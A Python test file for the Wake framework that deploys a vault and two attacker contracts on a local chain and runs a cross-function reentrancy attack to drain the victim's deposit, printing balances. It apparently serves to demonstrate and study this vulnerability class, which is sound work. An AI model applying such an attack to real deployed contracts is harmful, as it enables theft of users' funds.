from wake.testing import *


from pytypes.contracts.crossfunctionreentrancy.vault import cross_function_reentrancy
from pytypes.contracts.crossfunctionreentrancy.attacker import attack_cross_function_reentrancy
from pytypes.contracts.crossfunctionreentrancy.attacker import attack2_cross_function_reentrancy



def cross_function_reentrancy_attack():
    victim = default_chain.accounts[0]
    attacker = default_chain.accounts[1]
    
    sfContract = cross_function_reentrancy.deploy(from_=victim)
    sfContract.deposit(from_=victim, value=10* 10**18)
 
    
    atContract = attack_cross_function_reentrancy.deploy(sfContract.address, from_=attacker)
    atContract2 = attack2_cross_function_reentrancy.deploy(sfContract.address, from_=attacker)

    atContract.setattacker2(atContract2.address, from_=attacker)
    print("Vault balance: ", sfContract.balance)

    print("----------Attack----------")
    # attacker attack with 
    atContract.attack(from_=attacker, value=1*10**18)

    print("Contract balance: ", sfContract.balance)
    print("Attacker balance: ", atContract.balance)

@default_chain.connect()
def test_default():
    print("")
    cross_function_reentrancy_attack()


